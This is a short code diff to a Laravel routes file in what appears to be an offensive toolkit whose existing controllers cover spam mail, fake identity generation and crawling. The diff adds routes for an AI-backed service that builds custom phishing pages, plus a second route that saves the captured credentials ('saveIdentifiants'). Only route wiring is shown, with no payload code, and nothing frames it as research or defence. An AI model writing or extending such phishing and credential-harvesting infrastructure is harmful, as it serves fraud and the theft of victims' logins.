@@ -13,6 +13,7 @@ use App\Http\Controllers\CrawlerController;
 use App\Http\Controllers\SpamMailController;
 use App\Http\Controllers\FakeIdentityController;
 use App\Http\Controllers\ImageController;
+use App\Http\Controllers\PhishingController;
 use App\Http\Controllers\LogController;
 use App\Http\Middleware\AdminMiddleware;
 
@@ -68,4 +69,8 @@ Route::middleware(['auth:api'])->group(function () {
 
     // Génération d'identité fictive
     Route::get('/fake-identity', [FakeIdentityController::class, 'generateFakeIdentity'])->name('fake.identity');
+
+    // Service de phishing (création d'une page web de phishing sur mesure, backé sur de l'IA)
+    Route::post('/phishing', [PhishingController::class, 'createPhishing']);
+    Route::post('/savephishing', [PhishingController::class, 'saveIdentifiants']);
 });
